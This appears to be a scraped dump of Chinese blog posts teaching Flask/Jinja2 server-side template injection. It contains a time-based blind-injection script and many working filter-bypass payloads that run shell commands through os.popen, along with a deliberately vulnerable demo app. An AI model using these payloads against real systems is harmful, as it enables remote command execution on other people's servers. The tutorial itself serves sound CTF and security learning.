f&quot;code=....&quot;，也就是我们直接将字符串作为要发送的请求数据，而之前是使用json格式。但是我改变之后，发送请求，却发现对方服务器无法解析我们发送的数据包，我观察了两个脚本的请求数据包，发现不一样，然后我直接使用第一个脚本的数据包来设置headers，最终成功得到结果。 延迟盲注想要使用延迟盲注，我们还需要引入time等模块，比较麻烦，增加了绕过的难度，而且延迟盲注跑起来也比较慢，一般还是使用上面的那些方法，如果那些方法都不行的话，那么延迟盲注估计也不行了。但还是给个脚本。 12345678910111213141516171819202122232425262728293031323334353637383940#!/usr/bin/env python3# coding=utf-8import requestsimport time# 注意: 这里只适用于 &gt; 的情况flag = &quot;&quot;start = 1 # 第几个字符while True: low = 32 high = 128 mid = (low + high) // 2 # 整数除法 while low &lt; high: url = &quot;&quot; payload = f&quot;&#123;&#123;% set time=url_for.__globals__.__builtins__.__import__(&#x27;time&#x27;) %&#125;&#125;&#123;&#123;% set a=url_for.__globals__.os.popen(&#x27;whoami&#x27;).read(&#123;start&#125;) %&#125;&#125;&#123;&#123;% if a&gt;&#x27;&#123;flag + chr(mid)&#125;&#x27;%&#125;&#125;&#123;&#123;&#123;&#123; time.sleep(0.5) &#125;&#125;&#125;&#125;&#123;&#123;% endif %&#125;&#125;&quot; data = &#123; &quot;code&quot;: payload &#125; # 请求 start_time = time.time() response = requests.post(url=url, data=data) end_time = time.time() # 计算响应时间 response_time = end_time - start_time # 判断响应时间是否超过阈值 if response_time &gt; 0.5: # 页面返回正常 low = mid + 1 else: # 页面返回异常 high = mid mid = (low + high) // 2 if mid &lt;= 32 or mid &gt;= 128: break if chr(mid) == &#x27; &#x27;: break flag += chr(mid) print(flag) start += 1 如果跑出来的字符不对，可以调一下延迟时间。然后如果要使用编码绕过的话，脚本的修改和布尔盲注的一样。 小结整体来说，能写文件就写文件，不能写文件的话我其实是优先推荐使用布尔盲注。因为布尔盲注中不会引入新的变量，不会增加我们绕过的难度，结合我们后面介绍的一个工具，使用起来还是比较方便。其次再是响应包回显，然后是内存马。 参考文章 references: 讲解了新版下的三种内存马 讲解了新旧内存马 讲解了python中多个框架的内存马 响应包回显1 响应包回显2 …","tags":["无回显注入"],"categories":["python","ssti"]},{"title":"flask中的ssti注入-绕过","path":"/2024/12/26/flask中的ssti注入-绕过/","content":"[TOC] 摘要这篇文章本身主要是讲解针对ssti的过滤如何进行绕过（本篇文章的测试环境是python3.9.13，flask3.0.3）。 在我看来，面对黑名单过滤，最常用的就是两种，第一种是想方法绕过关键字的匹配还能使注入生效，第二种就是对方过滤不全，我们使用其他关键字进行代替来注入。我们这里主要提的是第一种。 我们先在这里给出我们上面一篇文章提出的一个基础的payload。 1&#123;&#123;().__class__.__base__.__subclasses__()[412].__init__.__globals__.__builtins__.__import__(&#x27;os&#x27;).popen(&#x27;echo hello&#x27;).read()&#125;&#125; 绕过关键字的匹配字符串绕过如果被过滤的关键字是字符串，我们可以将他转换为其他形式，除了保证绕过对关键字的匹配外，同时我们注入的表达式也还要能够被正常解析。 举一个例子（这里os被过滤了）： 1234567891011121314151617181920212223242526272829303132from flask import Flask, request, render_template_stringimport htmlapp = Flask(__name__)@app.route(&#x27;/&#x27;, methods=[&quot;GET&quot;])def source(): with open(__file__, &#x27;r&#x27;, encoding=&#x27;utf-8&#x27;) as f: return &#x27;&lt;pre&gt;&#x27; + html.escape(f.read()) + &#x27;&lt;/pre&gt;&#x27;@app.route(&#x27;/&#x27;, methods=[&quot;POST&quot;])def Template(): template_code = request.form.get(&quot;code&quot;) print(template_code) # 安全过滤 blacklist = [&#x27;os&#x27;] for black in blacklist: if black in template_code: print(black) print(&quot;hacker!!!!&quot;) return &quot;hacker!!!&quot; result = render_template_string(template_code) print(result) return result def run_flask_app(): app.run(debug=False, host=&#x27;127.0.0.1&#x27;, port=5000)if __name__ == &quot;__main__&quot;: run_flask_app() 下面只会贴出各种方法的测试结果图。 16进制 8进制 unicode编码 上面这三个算是使用得比较多的，也确实是简单好用，我们只需要注意不同形式前面需要加上对应的前缀。这里可以格外留言一下8进制的这种形式，因为他转换之后不包含字母，这一点在过滤了所有字母的题中很有用。 unicode字符欺骗Python 3 开始支持非ASCII字符的标识符，也就是说，可以使用 Unicode 字符作为 Python 的变量名，函数名等。Python 在解析代码时，使用的 Unicode Normalization Form KC (NFKC) 规范化算法，这种算法可以将一些视觉上相似的 Unicode 字符统一为一个标准形式。 12𝐢𝐦𝐩𝐨𝐫𝐭 //unicode欺骗字符import //正常半角英文字符 测试结果： 一些小细节： 不是所有的相似unicode字符都能够被正常解析 某些 unicode 在遇到 lower() 函数时也会发生变换，因此碰到 lower()、upper() 这样的函数时要格外注意 我测试了一下只有当我们在一个函数里面调用另一个函数的时候（字符串形式），我们可以将函数名字进行替换来绕过，这时能够被正常解析，其他时候不能。（作者对于这方面也不是很了解，测试做得也不够多，这里如果说错了，还请谅解） 记得先url编码再张贴到bp中 建议一般情况下面不要使用这个方法，只有当英文全部被过滤时可以考虑。 给出一个相似unicode寻找网站：https://shapecatcher.com/unicode/block/Mathematical_Alphanumeric_Symbols 全角英文使用方式和unicode字符欺骗类似。 给出一个payload： 1&#123;&#123;().__class__.__base__.__subclasses__()[412].__init__.__globals__.__builtins__.eval(&quot;__ｉｍｐｏｒｔ__(&#x27;\\u006f\\u0073&#x27;).popen(&#x27;echo hello&#x27;).read()&quot;)&#125;&#125; 我们修改上面测试代码，加上import过滤。 测试结果： 可以看到__ｉｍｐｏｒｔ__被成功解析了。 base64编码（只限于python2环境）这里具体的flask环境我们就不搭建了，来看一下使用方法即可，这里主要是借助的字符串中的decode方法。 python3中字符串的decode方法已经被删除了。 将字符串进行混淆这里太多了，不放测试结果图了，直接给payload。 +拼接： 1&#123;&#123;().__class__.__base__.__subclasses__()[412].__init__.__globals__.__builtins__.eval(&quot;__\\u0069\\u006d\\u0070\\u006f\\u0072\\u0074__(&#x27;o&#x27;+&#x27;s&#x27;).popen(&#x27;echo hello&#x27;).read()&quot;)&#125;&#125; //(&#x27;o&#x27;+&#x27;s&#x27;)=(&#x27;os&#x27;) 注意+在url传输中具有特殊含义，所以这里需要进行url编码。 ~拼接： 1&#123;&#123;().__class__.__base__.__subclasses__()[412].__init__.__globals__.__builtins__[&#x27;__imp&#x27;~&#x27;ort__&#x27;](&#x27;o&#x27;~&#x27;s&#x27;).popen(&#x27;echo hello&#x27;).read()&#125;&#125; //[&#x27;__imp&#x27;~&#x27;ort__&#x27;](&#x27;o&#x27;~&#x27;s&#x27;)=[&#x27;__import__&#x27;](&#x27;os&#x27;) 有点奇怪，这个可以，但是上面那个+直接改成~却不行。 中间加上&#39;&#39;: 1&#123;&#123;().__class__.__base__.__subclasses__()[412].__init__.__globals__.__builtins__.eval(&quot;__\\u0069\\u006d\\u0070\\u006f\\u0072\\u0074__(&#x27;o&#x27;&#x27;s&#x27;).popen(&#x27;echo hello&#x27;).read()&quot;)&#125;&#125; //(&#x27;o&#x27;&#x27;s&#x27;)=(&#x27;os&#x27;) 反转： 1&#123;&#123;().__class__.__base__.__subclasses__()[412].__init__.__globals__.__builtins__.eval(&quot;__\\u0069\\u006d\\u0070\\u006f\\u0072\\u0074__(&#x27;so&#x27;[::-1]).popen(&#x27;echo hello&#x27;).read()&quot;)&#125;&#125; //(&#x27;so&#x27;[::-1])=(&#x27;os&#x27;) 应该还有其他方法，这里就不再一一列举了。 使用函数进行字符串绕过这里太多了，不放测试结果图了，直接给payload。 replace函数： 1&#123;&#123;().__class__.__base__.__subclasses__()[412].__init__.__globals__.__builtins__.eval(&quot;__\\u0069\\u006d\\u0070\\u006f\\u0072\\u0074__(&#x27;ot&#x27;.replace(&#x27;t&#x27;,&#x27;s&#x27;)).popen(&#x27;echo hello&#x27;).read()&quot;)&#125;&#125; //(&#x27;ot&#x27;.replace(&#x27;t&#x27;,&#x27;s&#x27;))=(&#x27;os&#x27;) lower函数： 1&#123;&#123;().__class__.__base__.__subclasses__()[412].__init__.__globals__.__builtins__.eval(&quot;__\\u0069\\u006d\\u0070\\u006f\\u0072\\u0074__(&#x27;OS&#x27;.lower()).popen(&#x27;echo hello&#x27;).read()&quot;)&#125;&#125; //(&#x27;OS&#x27;.lower())=(&#x27;os&#x27;) format函数： 123&#123;&#123;().__class__.__base__.__subclasses__()[412].__init__.__globals__.__builtins__.eval(&quot;__\\u0069\\u006d\\u0070\\u006f\\u0072\\u0074__(&#x27;&#123;0:c&#125;&#123;1:c&#125;&#x27;.format(111,115)).popen(&#x27;echo hello&#x27;).read()&quot;)&#125;&#125;&#123;0:c&#125;&#123;1:c&#125;&#x27;.format(111,115) //这里c表示将ascii编码转换为对应的ascii字符，一个&#123;&#125;代表一个占位符 join函数： 123&#123;&#123;().__class__.__base__.__subclasses__()[412].__init__.__globals__.__builtins__.eval(&quot;__\\u0069\\u006d\\u0070\\u006f\\u0072\\u0074__(&#x27;&#x27;.join([&#x27;o&#x27;,&#x27;s&#x27;])).popen(&#x27;echo hello&#x27;).read()&quot;)&#125;&#125;&#x27;&#x27;.join([&#x27;o&#x27;,&#x27;s&#x27;] //将[&#x27;o&#x27;,&#x27;s&#x27;]里面的元素以&#x27;&#x27;(也就是空格的方式) 字符串是一个对象，这里都是使用的字符串中的方法。应该还有其他方法，感兴趣的话，我们可以使用dir(&quot;&#39;&#39;.__class__)查看一下字符串还有什么方法，自己研究一下。 chr函数： 12&#123;% set chr = ().__class__.__base__.__subclasses__()[412].__init__.__globals__.__builtins__.chr %&#125;&#123;&#123;().__class__.__base__.__subclasses__()[412].__init__.__globals__.__builtins__.eval(&quot;__\\u0069\\u006d\\u0070\\u006f\\u0072\\u0074__(chr(111)+chr(115)).popen(&#x27;echo hello&#x27;).read()&quot;)&#125;&#125; 这个函数可以将ascii编码转换为对应的ascii字符。但是不是很推荐使用，因为这个函数是内置函数，不是字符串对象中的方法，也不在模版空间的全局变量中，我们还需要引入之后才能使用。 从chr这个函数的过滤思想出发，就是我们可以先将字符串转换为对应的形式，再借助python中对应的函数转换回来。显然在python中我们可以找到很多这种函数。 我再给出一个例子 bytes函数： 12&#123;% set bytes = ().__class__.__base__.__subclasses__()[412].__init__.__globals__.__builtins__.bytes %&#125;&#123;&#123;().__class__.__base__.__subclasses__()[412].__init__.__globals__.__builtins__.eval(&quot;__\\u0069\\u006d\\u0070\\u006f\\u0072\\u0074__(bytes([111, 115]).decode()).popen(&#x27;echo hello&#x27;).read()&quot;)&#125;&#125; bytes 函数可以接收一个 ascii 编码列表，然后转换为二进制字符串，再调用 decode 则可以得到字符串。 使用__doc__属性我们先来看一下这个属性的作用。 我们可以看到两个字符串的内容是完全一样的，也就是__doc__是用于储存对象的文档字符串的，获取字符串之后我们就可以通过获取字符串中对应的字符来拼接来进行绕过。 举一个例子： 123&#123;&#123;().__class__.__base__.__subclasses__()[412].__init__.__globals__.__builtins__.eval(&quot;__\\u0069\\u006d\\u0070\\u006f\\u0072\\u0074__(().__doc__[34]+().__doc__[19]).popen(&#x27;echo hello&#x27;).read()&quot;)&#125;&#125;// ().__doc__[34]和().__doc__[19]就分别是o和s字符 其实如果过滤不严格的话，我们还可以直接： 12&#123;% set x = &quot;so&quot; %&#125;&#123;&#123;().__class__.__base__.__subclasses__()[412].__init__.__globals__.__builtins__[&#x27;__\\u0069\\u006d\\u0070\\u006f\\u0072\\u0074__&#x27;](x[1]+x[0]).popen(&quot;echo hello&quot;).read()&#125;&#125; 但是这里需要注意的是，我们不能在eval函数中使用｛%%｝定义的变量，eval函数执行时使用的是全局命名空间和局部命名空间。具体可以看一下文档：https://docs.python.org/3/library/functions.html#eval 小结：到目前为止，不严谨的算的话，我们已经讲了10几种字符串绕过的方法了。其实我这里还可以讲更多，但是没有必要了，方法都是大同小异的，我们更多的是需要掌握一种如何去进行绕过的思想。 非字符串绕过从上面可以看到针对字符串过滤有非常多的绕过方法，如果我们能够将非字符串转换为字符串，那么我们就可以借助上面的方法进行绕过。我们这里增加一个针对__class__的过滤。 想方法将非字符串转换为字符串使用[]前面的payload可以转换为 1&#123;&#123;()[&#x27;__cla&#x27;&#x27;ss__&#x27;].__base__[&#x27;__subclasses__&#x27;]()[412][&#x27;__init__&#x27;][&#x27;__globals__&#x27;][&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__\\u0069\\u006d\\u0070\\u006f\\u0072\\u0074__(&#x27;o&#x27;&#x27;s&#x27;).popen(&#x27;echo hello&#x27;).read()&quot;)&#125;&#125; 注意： 12&#123;&#123;()[&#x27;__cla&#x27;&#x27;ss__&#x27;].__base__&#125;&#125; //返回的是&lt;class object&gt;&#123;&#123;()[&#x27;__cla&#x27;&#x27;ss__&#x27;][&#x27;__base__&#x27;]&#125;&#125; //返回的是tuple[&#x27;__base__&#x27;] 这导致最后得到的子类不同，412超出了索引范围，然后我大概看了一下tuple[&#39;__base__&#39;]返回的子类，没发现什么可利用的。之前被坑过一次，但是这里我也不太清楚为什么返回结果不一样，不知道是否有师傅知道。因为后面有更简便的方法，可以不需要获取父类，所以这里就没有继续深究了。 使用[]也是绕过.的一种方法。 使用函数和过滤器getattr函数和attr过滤器 getattr函数可以获取对象的属性。 首先这个函数我们需要获取之后才能使用，其次这个函数使用起来也比较麻烦，因为他的调用方式是这样的getattr(obj,&#39;attribute&#39;)所以我们这里了解即可。 attr过滤器也可以获取对象的属性。但是attr是属于Jinja2模版空间的，我们可以结合管道符|直接使用，使用起来也更加方便。 1&#123;&#123;((()|attr(&#x27;__cla&#x27;&#x27;ss__&#x27;)|attr(&#x27;__base__&#x27;)|attr(&#x27;__subclasses__&#x27;)())[412]|attr(&#x27;__init__&#x27;)|attr(&#x27;__globals__&#x27;))[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__\\u0069\\u006d\\u0070\\u006f\\u0072\\u0074__(&#x27;o&#x27;&#x27;s&#x27;).popen(&#x27;echo hello&#x27;).read()&quot;)&#125;&#125; 这里需要格外注意的是，如果返回对象的是一个列表或者字典，我们直接使用attr是不行的，如： 123&#123;&#123;()|attr(&#x27;__cla&#x27;&#x27;ss__&#x27;)|attr(&#x27;__base__&#x27;)|attr(&#x27;__subclasses__&#x27;)()[412]&#125;&#125;&#123;&#123;((()|attr(&#x27;__cla&#x27;&#x27;ss__&#x27;)|attr(&#x27;__base__&#x27;)|attr(&#x27;__subclasses__&#x27;)())[412]|attr(&#x27;__init__&#x27;)|attr(&#x27;__globals__&#x27;)|attr(&#x27;__builtins__&#x27;)&#125;&#125; 这个时候我们可以将返回的对象整体使用()包裹起来再使用[]进行访问，如： 123&#123;&#123;(()|attr(&#x27;__cla&#x27;&#x27;ss__&#x27;)|attr(&#x27;__base__&#x27;)|attr(&#x27;__subclasses__&#x27;)())[412]&#125;&#125;&#123;&#123;(((()|attr(&#x27;__cla&#x27;&#x27;ss__&#x27;)|attr(&#x27;__base__&#x27;)|attr(&#x27;__subclasses__&#x27;)())[412]|attr(&#x27;__init__&#x27;)|attr(&#x27;__globals__&#x27;))[&#x27;__builtins__&#x27;]&#125;&#125; 这样写的话，整个payload就过于复杂，容易出现错误，而且[]被过滤了的话，上面就无法绕过了。我们这里可以使用__getitem__魔术方法，我们在使用[]来访问字典或者列表中的元素时就是在隐式地调这个方法。 1&#123;&#123;()|attr(&#x27;__cla&#x27;&#x27;ss__&#x27;)|attr(&#x27;__base__&#x27;)|attr(&#x27;__subclasses__&#x27;)()|attr(&#x27;__getitem__&#x27;)(412)|attr(&#x27;__init__&#x27;)|attr(&#x27;__globals__&#x27;)|attr(&#x27;__getitem__&#x27;)(&#x27;__builtins__&#x27;)|attr(&#x27;__getitem__&#x27;)(&#x27;eval&#x27;)(&quot;__\\u0069\\u006d\\u0070\\u006f\\u0072\\u0074__(&#x27;o&#x27;&#x27;s&#x27;).popen(&#x27;echo hello&#x27;).read()&quot;)&#125;&#125; 我们这里还可以使用pop方法来代替__getitem__，这个方法返回对应的元素时也会将元素从列表或者字典中删除，所以一般不推荐使用。 其中针对字典对象，我们还可以使用get方法和setdefault方法来获取字典中的元素。 还有使用__dict__魔术属性，这个属性储存的是对象中的所有属性，以字典的形式，也就是我们使用他来访问属性还得使用[]，再加上他本身也带有下划线，所以这个方法比较鸡肋。 vars函数，也可以使用来访问对象的属性，但是使用起来比较麻烦，这里权当记录一下。 想方法使用其他关键字进行代替非字符串中的关键字被过滤了，如果不转换为字符串形式，那么基本没有什么好的绕过方法。这个时候可以祈祷对方过滤不全，同时还可以寻找到其他具有类似功能的关键字进行代替。如__base__被过滤，我们还可以使用__mro__。 其实我们前面使用的payload都太长了，一方面是很容易踩到对方的黑名单，另一方面是手注的时候很容易出现错误，还不易察觉错误出现在哪里。所以我们一般是不使用上面这种payload的。我们可以进行精简。这也是使用其他关键字进行代替的一种思想，只要最终能够达到目的即可。 精简payload在精简之前，我们再分析一下我们的payload。 123456&#123;&#123;().__class__.__base__.__subclasses__()[412].__init__.__globals__.__builtins__.__import__(&#x27;os&#x27;).popen(&#x27;echo hello&#x27;).read()&#125;&#125;__globals__.__builtins__.__import__(&#x27;os&#x27;).popen(&#x27;echo hello&#x27;).read()//这一段明显是不能省略的，首先我们要执行命令，执行命令不能省，其次我们要找到定义才能执行命令//所以找到定义也不能省，那么我们是怎么找到的定义，是通过获取一个类，再获取一个python写的函数，再获取的定义//那么我们能不能直接获取类或者函数，这样前面这一堆就可以省了 还记得我们上一篇文章提到的模板环境中的全局变量和上下文环境中的全局变量吗，这些全局变量中既有函数又有类，我们还可以在模版中直接使用，这不就极大精简了我们的payload吗。显然使用函数比使用类还要再精简一点，我们这里直接看一下模板环境中的全局变量函数lipsum()。 1&#123;&#123;lipsum[&#x27;__globals__&#x27;][&#x27;o&#x27;&#x27;s&#x27;][&#x27;popen&#x27;](&#x27;echo hello&#x27;).read()&#125;&#125; 这里为什么不需要使用__builtins__呢，因为lipsum是定义在utils.py文件中，而这个文件中导入了os模块，__globals__会直接返回函数所在py文件的全局变量，所以我们这里可以直接使用os模块。这个payload应该是最简单的应该payload之一了。 我们还可以使用上下文环境中的全局变量函数url_for()和函数get_flashed_messages()来代替lipsum函数，他们是定义在helpers.py文件中，这个文件同样导入了os模块。 关于函数就是这三个了，如果都被过滤了，优先考虑使用模板环境中的类，因为模板环境中的类也是定义在utils.py文件中，我们可以直接使用os模块。 两个引号被过滤了可以看到字符串绕过能力非常强，所以有的时候对方会直接将两个引号给过滤掉，让我们直接使用不了字符串。所以我们这里再总结一下引号被过滤了如何绕过。 使用chr函数，bytes函数和__doc__属性前面在讲解字符串绕过的时候已经提过，这里不再多讲，直接给payload。 先给出一个chr的脚本，方便转换，我一般是习惯使用+，因为我一般是在bp中再进行url编码。你这里也可以改为%2b。 123456789&lt;?php$a = &#x27;echo hello&#x27;;$result = &#x27;&#x27;;for($i=0;$i&lt;strlen($a);$i++)&#123; $result .= &#x27;chr(&#x27;.ord($a[$i]).&#x27;)+&#x27;;&#125;echo substr($result,0,-1);?&gt; 这里函数是否能够直接访问__builtins__属性可能会受到flask版本影响。我在使用3.0.3版本时没有问题，但是使用2.0.3时不能直接访问。 12&#123;% set chr = lipsum.__builtins__.chr %&#125;&#123;&#123;lipsum[chr(95)+chr(95)+chr(103)+chr(108)+chr(111)+chr(98)+chr(97)+chr(108)+chr(115)+chr(95)+chr(95)][chr(111)+chr(115)][chr(112)+chr(111)+chr(112)+chr(101)+chr(110)](chr(101)+chr(99)+chr(104)+chr(111)+chr(32)+chr(104)+chr(101)+chr(108)+chr(108)+chr(111)).read()&#125;&#125; bytes的脚本 12345678910def convert_string_to_bytes_decode(input_string): byte_values = [ord(char) for char in input_string] byte_string = &#x27;, &#x27;.join(map(str, byte_values)) result = f&quot;bytes([&#123;byte_string&#125;]).decode()&quot; return result# 示例input_string = &#x27;os&#x27;converted_string = convert_string_to_bytes_decode(input_string)print(converted_string) # 输出: bytes([111, 115]).decode() 12&#123;% set bytes = lipsum.__builtins__.bytes %&#125;&#123;&#123;lipsum[bytes([95, 95, 103, 108, 111, 98, 97, 108, 115, 95, 95]).decode()][bytes([111, 115]).decode()][bytes([112, 111, 112, 101, 110]).decode()](bytes([101, 99, 104, 111, 32, 104, 101, 108, 108, 111]).decode()).read()&#125;&#125; __doc__属性这个直接看前面理解一下就行了。 使用request和session这个方法比上面要好，一方面这两个对象是上下文环境中的全局变量，可以直接使用；另一方面就是这两个使用起来更加清晰，不容易出错，发现错误也容易。直接看payload理解吧。 request 1&#123;&#123;lipsum[request.values.glo][request.values.so][request.values.po](request.values.pla).read()&#125;&#125;&amp;glo=__globals__&amp;so=os&amp;po=popen&amp;pla=echo+hello 我们这里还可以将请求参数写在cookie和请求头中。 这里在命名时需要小心，我之前使用pop=popen，但是pop这个名字比较常见，可能是导致了命名冲突，换了一个名字就好了。 session 这里session理论也是可以的，但是因为session需要开启才能使用，所以这里就不再测试了，了解即可。 借助过滤器和dict类12345678910&#123;% set gl = dict(__globals__=1)|join %&#125; &#123;% set so = dict(o=1,s=1)|join %&#125;&#123;% set po = dict(popen=1)|join %&#125; &#123;% set re = dict(read=1)|join %&#125;&#123;% set ge = dict(__getitem__=1)|join %&#125; &#123;%set space=&#123;&#125;|select()|string()|attr(ge)(10)%&#125;&#123;% set cmd1 = dict(echo=1)|join %&#125; &#123;% set cmd2 = dict(hello=1)|join %&#125; &#123;% set cmd = cmd1 ~ space ~ cmd2 %&#125; &#123;&#123; lipsum|attr(gl)|attr(ge)(so)|attr(po)(cmd)|attr(re)() &#125;&#125; 12&#123;% set a = dict(__globals__=1)|join %&#125; 这里set就是在定义变量,dict是一个内置类，这里是在创建一个实例对象，所以这里就变成了&#123;&#x27;__globals__&#x27;:1&#125;，|是用来传递结果的，join是Jinja2的过滤器，用于将序列中的元素连接成一个字符串，默认使用空字符串进行连接，也可以使用join()来指定连接符，这里会将字典的键名进行连接，所以最后就是相当于set a = &#x27;__globals__&#x27; 1234&#123;% set ge = dict(__getitem__=1)|join %&#125; &#123;%set space=&#123;&#125;|select()|string()|attr(ge)(10)%&#125;这里其实是在构造空格，select()也是一个过滤器，他会返回一个生成器对象，&lt;generator object select_or_reject at 0x0000027188A13760&gt;，string也是一个过滤器，将变量转换为字符串类，得到&quot;&lt;generator object select_or_reject at 0x0000027188A13760&gt;&quot;，然后我们就可以使用__getitem__方法来获取这个字符串中对应的字符，这里__getitem__(10)就是空格 借助过滤器的话，还有许多其他的方法，这里就不再一一讲解了。 数字绕过一般情况下面我们的payload是完全不需要数字的，毕竟简化之后的payload我们已经不需要通过列表的索引来获取类。但是当我们借助一些编码，函数，过滤器等去进行绕过的时候，这个时候的payload中就会包含数字了。 unicode字符欺骗参考前面字符串绕过中提到的。这个方法不推荐，测试了一下，效果不好，当然可能是我个人原因，所以这里先记录一下。我们在得到一些数字之后，借助加减乘除可以得到其他数字 借助过滤器12&#123;% set a = dict(e=a)|join|count %&#125; #1 count&#123;% set c = dict(e=a)|join|length %&#125; #1 length 借助函数或者方法ord函数 12&#123;% set ord = lipsum.__builtins__.ord %&#125;&#123;% set a = ord(&#x27;a&#x27;) %&#125; #97 index方法 1&#123;&#123;(&#x27;a&#x27;).index(&#x27;a&#x27;)&#125;&#125; #0 find方法 1&#123;&#123;&quot;abc&quot;.find(&#x27;c&#x27;)&#125;&#125; #2 差不多就是这两个方向，要么使用python中的函数，要么使用Jinja2中的过滤器。 然后得到数字之后，如何进行拼接，其实也存在着一定问题，但是这里就不再细讲了。如果有机会再补充吧。 一些有趣的绕过和知识长度绕过直接参考ctfshow单身杯ctf中ezzz__ssti的题解 Jinja2语法标识绕过（要求存在原型链污染）简单来说，就是&#123;&#123;&#125;&#125;和&#123;%%&#125;这两种语法标识，如果存在原型链污染漏洞的话，我们是可以污染成我们自己设定的语法标识。具体可以参考这篇文章 未定义类的注入1&#123;&#123;x.__init__.__builtins__.eval(&quot;__\\u0069\\u006d\\u0070\\u006f\\u0072\\u0074__(&#x27;o&#x27;&#x27;s&#x27;).popen(&#x27;echo hello&#x27;).read()&quot;)&#125;&#125; 这里x我们没有进行定义，这个时候的x属于runtime.py中的Undefined类，而且这个类还重写了__init__方法，所以我们这里直接就可以使用他来获取内置模块。 这个payload还是很神奇的，如果我们记不住模板环境和上下文环境中的关键字，或者他们被过滤的时候，我们就可以使用这个方法。这个也是无意间测试发现的，不知道是否有什么版本要求。 不要过分执着于命令执行命令执行的本质也是读取文件，获取信息。但是有的时候，信息可能没有藏在文件中，而是藏在python代码的某一个变量中，这个时候我们可以借助config或者其他去读取信息，不要过分执着于命令执行本身。 小结flask中的ssti有回显注入到这里就告一段落了，其实一开始写这一篇文章的时候是想着将无回显注入也写了，但是后面越写越长，就干脆分成两篇了。这篇文章有些地方讲得不一定准确，还请谅解。 这里再推荐两个靶场来进行练习巩固，一个是github上面的一个sstilabs，一个是ctfshow中的ssti注入专题，不过这个需要会员。 后面如果还有什么好玩的payload，会补充在文章末尾。 参考文章 references: ssti绕过1 ssti绕过2 ssti绕过3 这个是讲解沙箱绕过的，两者有很多相通的地方 这个是讲原型链污染的，讲得很全面，里面有讲到了对Jinja2语法标识的污染 CTFshow 单身杯CTF 官方WP sstilabs ctfshow …","tags":["绕过"],"categories":["python","ssti"]},{"title":"flask中的ssti注入-前置基础知识","path":"/2024/12/23/flask中的ssti注入-前置基础知识/","content":"[TOC] 摘要为什么要写这一篇文章呢？一方面是是为了防止手注时出现错误不知如何进行更改，另一方面是后面讲得所有的利用和绕过都是在此基础上，只有对这方面有所了解，你才能理解后面的payload。（会讲得比较细致，适合零基础的小白）。不过为了尽可能精炼一点，这里对一些基础的概念不会进行讲解。 flask框架什么情况下面会产生ssti注入漏洞基础理解： flask是使用Jinja2模板引擎对数据进行渲染的，Jinja2主要是负责将网站的数据进行展示，而Jinja2是使用python语言写的，我们在进行数据渲染和展示的时候本质上调用的是Jinja2中的函数。当然Jinja2本身是一个安全的模板引擎，只不过在我们使用不当的时候就会产生漏洞。 在使用 Flask 进行模板渲染时，通常有两种方式，分别使用到两个函数：render_template 和 render_template_string。这两个函数都是 Flask 提供的便捷函数，它们对 Jinja2 中 Template类的 render 方法进行了封装，为我们提供了更加方便的使用接口。 所以这里我们先去看一下Template类中render方法的源码。 renderTemplate 类定义在 Jinja2 的 environment.py 文件中。 在render方法中调用了 self.root_render_func，也就是这个类中的根渲染函数。当我们去查看这个函数时，会发现这个函数并没有在类中显式定义，这是因为这个函数是在模板编译过程中动态生成的。 在底层，Jinja2 首先将模板源代码（包含 Jinja2 模板语法的前端代码）解析为抽象语法树（AST），然后将其转换为可执行的 Python 代码。在这个过程中，会生成 root_render_func 函数。在渲染时，调用这个函数，并将上下文数据传递给它，根据占位符进行渲染。 这个过程远比我这里讲述的要复杂得多。例如，在生成的 Python 函数中，会自动调用其他函数进行 HTML 转义，以防止 XSS 攻击。此外，如果我们传入的是一个字符串形式的 Python 表达式，Jinja2 并不会对这个表达式进行解析和执行，而是直接将其作为字符串进行渲染。 如果你了解过 Java 中的 JSP，你会更容易理解上述内容。Java 中的 JSP 页面在运行时会被转换为对应的 Java 代码，调用生成的 service 方法进行渲染。Jinja2 的工作原理与此类似。 这种设计方式可以减少对于模板源代码的解析，我们可以对生成的编程语言代码进行重复使用，还可以进行优化，这提高了渲染性能和运行效率，以及能够在编译的时候进行错误检查和安全检测等。 接下来我们看一下render_template和render_template_string这两个函数。 render_template 我们观察这个函数，可以看到这个函数接收两个参数，第一个参数是模板文件的名称，它可以是字符串也可以是列表，如果是列表，则只取列表中的第一个元素来加载模板；然后第二个参数是一个可变长度的关键字参数，我们可以传递多个关键字参数，这些参数会被打包成一个字典，在后面将模板源代码转换为python代码时，我们就是通过对应的键名来获取对应的键值从而进行渲染。然后这里进行渲染是又调用了_render函数。 我们再来看一下_render函数源码。 我们可以看到这里rv = template.render(context)，这里template就是Template类的实例对象，也就是我们程序中的实际模板文件，render就是Template类中的render方法，我们前面已经分析过了。 整个渲染过程就比较清晰了。 templating.py#render_template() -&gt; templating.py#_render() -&gt; environment.py#Template#render() -&gt; environment.py#Template#root_render_func() 我们现在来看一个具体使用的例子。 先创建一个templates文件夹，再创建一个模板文件1.html放在里面，文件内容如下： 123456789101112&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;test&lt;/title&gt;&lt;/head&gt;&lt;body&gt;hello, &#123;&#123;name&#125;&#125;!&lt;br&gt;welcome to &#123;&#123;address&#125;&#125;!&lt;/body&gt;&lt;/html&gt; 再在templates同级目录下面创建一个py文件，内容如下： 123456789101112from flask import Flask, render_templatefrom jinja2 import Templateapp = Flask(__name__)@app.route(&#x27;/&#x27;)def home(): rendered = render_template(&quot;1.html&quot;,name=&quot;xwx&quot;,address=&quot;guangzhou&quot;) return renderedif __name__ == &#x27;__main__&#x27;: app.run(debug=True) 运行之后，就能够在浏览器看到输出。 12hello, xwx!welcome to guangzhou! 我们可以这这里分别使用这两个参数测试一下，能不能将我们注入的xss代码和python代码进行解析。 123name = &quot;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;&quot;address = &quot;().__class__&quot;rendered = render_template(&quot;1.html&quot;,name=name,address=address) 得到的输出是： 12hello, &lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;!welcome to ().__class__! 可以看到两个都没有解析，都是直接输出的，因为我们已经分析过了render_template函数调到最后其实调的就是root_render_func函数，而这个函数是动态生成的，他会进行安全处理，所以我们的xss攻击和ssti注入失效了。 render_template_string 可以看到，这个函数接收两个参数，一个是整个模板源代码组成的字符串，一个是可变参数，后面进行模板渲染的，最后也是调用了_render函数。所以这个函数正常使用也是安全的。 我们来举一个例子测试一下。 1234567891011121314151617181920212223242526from flask import Flask, render_template, 